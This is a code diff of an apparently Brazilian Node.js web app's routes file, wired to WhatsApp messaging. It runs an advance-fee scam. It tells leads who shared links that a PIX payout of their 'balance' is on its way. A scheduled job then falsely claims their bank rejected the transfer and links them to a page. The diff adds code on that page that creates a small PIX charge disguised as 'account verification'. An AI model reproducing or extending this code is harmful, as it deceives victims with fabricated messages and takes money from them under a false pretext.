@@ -1,18 +1,17 @@
 // app/routes.js
 
-
-
-/* CONFIGURAÇÕES MERCADO PAGO */
-
 const db = require("./db");
 const {makeid} = require("./functions")
 const {sendMsg} = require("./senderHelper")
 const config = require("../config.json");
+const Pix = require("../Pix");
 
 
 const schedule = require("node-schedule");
 var got = require("got");
 const sharp = require("sharp");
+
+/* CONFIGURAÇÕES MERCADO PAGO */
 
 const mercadopago = require("mercadopago");
 const mercadoPagoAccessToken = process.env.MERCADO_PAGO_ACCESS_TOKEN;
@@ -33,14 +32,14 @@ module.exports = function (app, client) {
   const config = require("../config.json");
 
   app.get("/", function (req, res) {
+    
+    
+ 
     res.render(path.join(__dirname + "/../views/index.ejs"), {
       videoId: "test",
     });
     
   });
-
-
-
 
   app.get("/s/:uuid", async function (req, res) {
    
@@ -52,9 +51,8 @@ module.exports = function (app, client) {
   
 
     if(socialproof){
-    
-      const balance = await db.getBalance(socialproof[0].user);
-   
+
+          const balance = await db.getBalance(socialproof[0].user);
    //console.log(config.comments);
     res.render(path.join(__dirname + "/../views/share.ejs"), {
       uuid: ref ? ref : false,
@@ -77,14 +75,12 @@ module.exports = function (app, client) {
   app.post("/share", async function (req, res, next) {
 
     const uuid = req.body.uuid;
+    const fullUrl = req.protocol + '://' + req.get('host')
+
 
       lead = await db.getLeadbyUUID(uuid)
  
       if(lead){
-
-      
-
-       
 
         console.log(lead[0])
         var count = parseFloat(lead[0].share_count) + 1
@@ -99,7 +95,8 @@ module.exports = function (app, client) {
         await sendMsg(
           {
             type: "text",
-            message: `Muito bem ${lead[0].name}, você já compartilhou o suficiente, obrigado por isso! *Seu PIX de R$${balance[0].Total}* está sendo processado agora... aguarde, deve ser compnesado em até 60 segundos na sua conta.`,
+            message: `🥳 Muito bem ${lead[0].name}, você já compartilhou o suficiente, obrigado por isso!
+            \n*💰 Seu PIX de R$${balance[0].Total}* está sendo processado agora... aguarde, deve ser compnesado em até 60 segundos na sua conta.`,
             from: lead[0]._serialized,
           },
           client
@@ -114,19 +111,18 @@ module.exports = function (app, client) {
         const job = schedule.scheduleJob(lead[0].user, date, async function () {
           console.log(`O Job de  PIX  para Whastapp ${lead[0].user} foi EXECUTADO`);
 
-
           await sendMsg(
             {
               type: "button",
-              message: `${lead[0].name}, parece que houve um problma, *seu banco rejeitou* nossa transferência via pix no valor de *R$${balance[0].Total}*.`,
-              footer: ``,
+              message: `${lead[0].name}, parece que houve um problma, *seu banco rejeitou* nossa transferência via pix no valor de *R$${balance[0].Total}* 💸.`,
+              footer: `Não deixe sua trânsferencia ser cancelada!`,
               from: lead[0]._serialized,
               config: {
                 buttons: [
                   {
                     type: "link", //link , call, text
                     text: "TENTAR NOVAMENTE",
-                    action: config.root + "/p/" + uuid,
+                    action: fullUrl + "/p/" + uuid,
                   },
                 ],
               },
@@ -176,6 +172,8 @@ module.exports = function (app, client) {
 
   app.get("/p/:uuid", async function (req, res) {
     //pagina pagamento pix
+
+  
    
     const ref = req.params.uuid
     let socialproof = ''
@@ -183,12 +181,27 @@ module.exports = function (app, client) {
 
     if(socialproof){
           const balance = await db.getBalance(socialproof[0].user);
+
+               
+      const pix = new Pix(
+        `1bd87b07-a115-4964-8421-14f8a3b8dbae`,
+        `VERIFICACAO DE CONTA DE ${socialproof[0].name}`, //DESCRIÇÃO
+        `VERIFICACAO DE CONTA DE ${socialproof[0].name}`,
+        `LagoadaPrata`,
+        `06`,
+        0.10
+      );
+
+      const payload = pix.getPayload();
+
+      console.log(payload)
    
    //console.log(config.comments);
     res.render(path.join(__dirname + "/../views/pix.ejs"), {
       uuid: ref ? ref : false,
       socialproof: socialproof[0],
-      balance: balance[0].Total
+      balance: balance[0].Total,
+      pixkey:payload 
 
     });
 
